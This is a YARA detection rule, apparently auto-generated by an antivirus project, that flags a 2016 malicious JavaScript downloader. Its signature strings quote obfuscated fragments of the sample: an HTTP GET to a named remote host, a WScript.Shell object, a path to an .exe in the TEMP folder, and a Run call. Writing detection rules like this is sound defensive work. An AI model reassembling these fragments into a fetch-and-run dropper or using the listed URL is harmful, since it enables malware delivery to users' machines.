rule sig_20160401_ab6d901b8a554d5975354093b81560d5 {
  meta:
    description = "datamaliciousorder - file 20160401_ab6d901b8a554d5975354093b81560d5.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "27b3470acc107e9949c01323018250990f58aaaaadb60822c9a605b5256823fe"

  strings:
    $s1  = "YxwCp[GrqCio](\"G\" + \"ET\", \"http://beatorooms.com/n2isa\", false);" fullword ascii
    $s2  = "var LdFt = function ElKtt() {return WScript[DjOy](\"WScript\"+\".Shell\");}(), OnrUt = 11;" fullword ascii
    $s3  = "function ZmWrw(PhbXxp, OxXf){TsaLe = TsaLe * 1; return PhbXxp - OxXf;};" fullword ascii
    $s4  = "if (YxwCp[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function JcnMl() {return LdFt[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Pe1X9lg0TvCw.ex\" + \"e\";};" fullword ascii
    $s6  = "function PvJnd(){return XeRw + \"\";};" fullword ascii
    $s7  = "function UqFor() {return ((IsHmy == true) && (IsHmy == CpiLw)) ? 1 : TsaLe;};" fullword ascii
    $s8  = "var KwAm = new this[\"Date\"]();" fullword ascii
    $s9  = "}while (EdOee);" fullword ascii
    $s10 = "IsHmy = true; " fullword ascii
    $s11 = "function UeUhi(){return 23;};" fullword ascii
    $s12 = "function LggFv(HuiAr){LdFt[\"R\"+\"un\"](HuiAr, TsaLe, TsaLe);};" fullword ascii
    $s13 = "function VlAq(){return DjOy;};" fullword ascii
    $s14 = "var PevTh = false;" fullword ascii
    $s15 = "var CpiLw = false;" fullword ascii
    $s16 = "var IsHmy = false;" fullword ascii
    $s17 = "function MsDhz(XmlRl) {var YbqDf = (1, 2, 3, 4, 5, XmlRl); return YbqDf;};" fullword ascii
    $s18 = "function OlaAdj()" fullword ascii
    $s19 = "CpiLw = true; " fullword ascii
    $s20 = "return ZmWrw(HjYvm, EumHk);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}